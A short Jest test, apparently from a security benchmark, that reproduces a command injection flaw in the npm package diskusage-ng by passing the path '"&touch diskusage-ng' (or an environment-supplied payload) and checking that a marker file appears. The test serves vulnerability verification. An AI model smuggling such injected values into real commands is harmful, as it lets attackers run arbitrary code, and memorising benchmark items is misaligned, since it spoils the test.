test("Command Injection in diskusage-ng", (done) => {
  expect.assertions(2);
  const root = require("diskusage-ng");
  const fs = require("fs");
  const path = "./diskusage-ng";
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
    }
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  root([process.env.SECBENCH_PAYLOAD || ('"&touch diskusage-ng"')], () => {
    file_exist = fs.existsSync(path);
    expect(file_exist).toBe(true);
    fs.unlinkSync(path);
    done();
  });
});
